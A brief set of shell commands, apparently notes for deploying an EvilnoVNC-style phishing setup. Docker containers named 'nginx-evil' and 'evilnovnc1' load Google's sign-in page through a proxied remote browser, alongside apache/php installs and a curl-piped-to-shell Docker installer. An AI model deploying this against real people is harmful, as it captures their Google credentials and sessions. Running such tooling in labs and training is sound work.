sudo docker run --name nginx  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd):/usr/share/nginx/html --network nginx-evil -p 8080:8080 -d nginx
sudo docker run -d --rm  -v "${PWD}/Downloads":"/home/user/Downloads" -e FOLDER=google -e RESOLUTION=1920x1080x24 -e WEBPAGE=https://accounts.google.com/ --network=nginx-evil --name evilnovnc1 evil_edu
sudo docker exec nginx nginx -t
sudo docker exec nginx nginx -s reload
apt update && apt install apache2 php7.4 vim -y
sed -i 's/80/8080/g' /etc/nginx/conf.d/default.conf && nginx -s reload

a2enmod php7.4
service apache2 start
curl -fsSL https://get.docker.com | sh
